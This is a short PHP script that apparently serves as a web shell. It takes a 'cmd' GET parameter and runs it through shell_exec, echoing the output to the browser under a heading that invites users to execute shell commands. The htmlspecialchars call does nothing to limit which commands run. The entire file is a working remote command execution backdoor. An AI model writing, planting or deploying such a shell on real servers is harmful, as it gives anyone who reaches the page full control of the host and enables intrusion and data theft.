<?php 


echo "<h1>Use get parameter to execute shell commands .</h1>";

if(isset($_GET['cmd'])){
    $cmd = htmlspecialchars($_GET['cmd']);

    if(!empty($cmd)){

        echo shell_exec($cmd)."/n";
    }
}




?>